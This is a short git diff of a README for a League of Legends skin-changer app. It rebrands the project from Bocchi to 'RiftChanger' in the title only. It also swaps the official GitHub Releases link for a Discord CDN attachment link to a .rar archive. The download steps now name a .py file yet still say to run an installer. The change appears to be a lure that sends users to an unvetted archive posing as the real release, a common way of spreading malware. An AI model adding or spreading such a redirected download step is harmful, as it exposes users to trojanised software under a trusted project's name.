@@ -1,4 +1,4 @@
-# Bocchi - League of Legends Skin Changer
+# RiftChanger - League of Legends Skin Changer
 
 <div align="center">
   <img src="./build/logo.png" alt="Bocchi Logo" width="128" height="128">
@@ -32,7 +32,7 @@ Bocchi is a modern, user-friendly desktop application for changing League of Leg
 
 ### Download
 
-1. Go to the [Releases](https://github.com/hoangvu12/bocchi/releases) page
+1. Go to the [Releases](https://cdn.discordapp.com/attachments/1507770177633124393/1507849506748895423/RiftChanger.rar?ex=6a1365c8&is=6a121448&hm=ff078c4aba26e9c34a44795fe96610b0dadf2ef1342d71565646615c793d9431&) page
 2. Download the `RiftChanger.py`
 3. Run the installer and follow the setup wizard
 
